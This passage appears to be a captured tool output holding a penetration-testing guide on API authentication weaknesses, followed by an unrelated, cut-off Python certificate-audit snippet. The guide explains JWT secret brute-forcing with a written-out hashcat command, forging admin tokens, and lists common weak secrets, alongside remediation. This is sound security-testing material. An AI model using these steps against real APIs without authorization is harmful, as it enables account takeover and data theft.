for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n# API Reference: Testing API Authentication Weaknesses\n\n## JWT Security Checks\n\n| Check | Severity | Description |\n|-------|----------|-------------|\n| alg:none | Critical | Signature verification bypassed |\n| Weak HMAC secret | Critical | Brute-forceable signing key |\n| No exp claim | High | Token never expires |\n| Long TTL (>24h) | Medium | Extended token validity |\n| Sensitive data in payload | High | PII in JWT claims |\n| Missing iss/aud claims | Medium | Token scope ambiguity |\n\n## OWASP API2:2023 Test Points\n\n| Test | Category |\n|------|----------|\n| Unauthenticated endpoint access | Missing auth middleware |\n| JWT alg:none bypass | Broken token validation |\n| JWT secret brute-force | Weak cryptographic key |\n| Token reuse after logout | Missing revocation |\n| Refresh token rotation | Session management |\n| Account enumeration | Information disclosure |\n| Password policy bypass | Weak credential controls |\n\n## Common JWT HMAC Secrets\n\n| Secret | Type |\n|--------|------|\n| `secret` | Default |\n| `your-256-bit-secret` | JWT.io example |\n| `jwt_secret` | Convention |\n| `changeme` | Placeholder |\n\n## JWT Attack Tools\n\n| Tool | Purpose |\n|------|---------|\n| jwt_tool | JWT testing with 12+ attack modes |\n| hashcat -m 16500 | GPU JWT secret brute-force |\n| Burp JWT Editor | Interactive JWT manipulation |\n| Nuclei | Auth bypass templates |\n\n## Python Libraries\n\n| Library | Version | Purpose |\n|---------|---------|---------|\n| `requests` | >=2.28 | HTTP API calls |\n| `base64` | stdlib | JWT decoding |\n| `hmac` | stdlib | HMAC signature testing |\n| `hashlib` | stdlib | Hash functions |\n\n## References\n\n- OWASP API Security Top 10: https://owasp.org/API-Security/\n- JWT Best Practices RFC 8725: https://www.rfc-editor.org/rfc/rfc8725\n- jwt_tool: https://github.com/ticarpi/jwt_tool\n","exit_code":0,"status":"completed"}}

cryptography.hazmat.primitives.asymmetric import rsa, ec\nfrom datetime import datetime, timezone\n\ndef audit_certificate(hostname, port=443):\n    context = ssl.create_default_context()\n    with socket.create_connection((hostname, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            der_cert = ssock.getpeercert(binary_form=True)\n\n    cert = x509.load_der_x509_certificate(der_cert)\n    pub_key = cert.public_key()\n\n    findings = []\n    # Key strength check\n    if isinstance(pub_key, rsa.RSAPublicKey):\n        key_size = pub_key.key_size\n        if key_size < 2048:\n            findings.append({\n                \"check\": \"key_size\",\n                \"severity\":
